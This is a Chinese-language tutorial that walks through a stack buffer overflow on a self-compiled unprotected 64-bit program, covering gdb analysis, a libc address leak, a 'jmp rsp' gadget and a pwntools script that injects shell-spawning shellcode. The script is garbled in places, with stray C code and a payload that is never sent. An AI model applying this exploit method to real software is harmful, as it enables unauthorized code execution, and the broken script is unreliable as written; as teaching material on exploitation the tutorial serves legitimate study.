然后用这条命令编译一个没有任何保护的程序gcc -z execstack -fno-stack-protector -no-pie example.c -o example，我这里只装了64位的gcc，所以编译出来是64位，其实和32位差别不大，只不过64位是用寄存器来传参数


我们先来了解栈溢出原理：

栈溢出主要是程序会将函数返回地址存储在栈中引起的，通过gdb来分析一下。

gdb程序 然后 b*main就能断在main函数了。



rsp寄存器就是指向栈区的寄存器，我们看main函数开始是，栈区已经有了返回地址，当main函数执行完毕后，通过函数尾部的ret指令就会到libc_start_main + 240处，这就是用于函数调用call ret，然后程序又会使用sub rsp,0x20来开扩我们局部变量的内存，也就是s，s总共0x20（32）个空间，而且s地址在程序放回地址的上方，当我们正常输入大于40个数量时，此时程序的返回地址就会变成我们可控的数据，从而控制程序流程




1.首先我们来控制没有任何保护的程序，因为没有任何保护。所以栈区可以执行，通过jmp rsp，或call rsp 就能执行shellcode，我们使用ROPgadget工具来找到这个指令（pwntools附带）ROPgadget --binary example --only 'jmp'|grep rsp


但是无论是call rsp和jmp rsp都无法找到，这时我们可以通过libc库来寻找指令，libc库就和windows的dll类似，时所有动态链接linux程序都会加载的，但是基地址随机，所以我们要泄露libc地址，我们看这个程序的返回地址就是在libc中，所以可以用来泄露libc基地址，所有libc函数都在libc中（也就是scanf,read)等函数，大部分都在各种加载库中，而libc库就是一个必须的加载库，我们只要输入40个字符，就能泄露这个地址，因为read函数不会产生\x00截断，所以输入40个字符，此时40个字符后就是libc中的地址，没有\x00截断符号，所以因为puts(s)就会将libc地址输出，此时libc中有jmp rsp指令


我们使用这个指令就能执行shellcode了



使用python脚本来获取shell

首先我们需要


coding:utf-8     from pwn import *         context.arch = 'amd64'#设置架构为amd64位sh = process('./example')#运行本机的example程序payload = 'a'*0x28sh.send(payload)#发送payload给程序sh.recvuntil(payload)#接收payload的字符串，# 因为程序就是一个输入输出的程序，我们输入了payload就会输出payloadreturn 0;}libc_base = u64(sh.recvn(6).ljust(8,'\x00')) - 0x20830#因为没有\x00截断，所以会多输出libc中的地址，在通过偏移得到libc基地址，偏移可以通过# gdb vmmap命令获取libc基地址后再将泄露地址减去基地址得到jmp_rsp = 0x2a71 + libc_base#通过libc基地址获得jmp rsp的地址payload = 'a'*0x28 + jmp_rsp + asm(shellcraft.sh())#shellcraft是pwntools带的shellcode生成器，sh.send('quit')# 退出循环sh.interactive()#激活交互窗口


此时我们成功getshell，并可以执行命令。
